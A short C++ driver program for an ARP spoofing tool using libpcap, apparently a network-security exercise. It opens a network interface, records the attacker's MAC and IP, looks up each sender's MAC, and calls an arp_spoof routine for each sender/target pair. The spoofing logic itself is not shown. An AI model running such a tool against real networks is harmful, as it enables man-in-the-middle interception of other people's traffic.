#include "my-func.h"

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 == 1) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // get attacker info
    get_myinfo(dev);

    printf("Attacker MAC: %s\n", std::string(attacker.mac).c_str());
    printf("Attacker IP: %s\n", std::string(attacker.ip).c_str());

    int cnt = 0;
    for (int i=2;i<argc;i+=2){
        printf("\n======Pair %d======\n", ++cnt);
        sender.ip = Ip(argv[i]);
        target.ip = Ip(argv[i+1]);

        // get sender MAC
        sender.mac = get_smac(handle);
        printf("Sender MAC: %s\n", std::string(sender.mac).c_str());

        // spoof
        arp_spoof(handle);
    }
    pcap_close(handle);
    return 0;
}
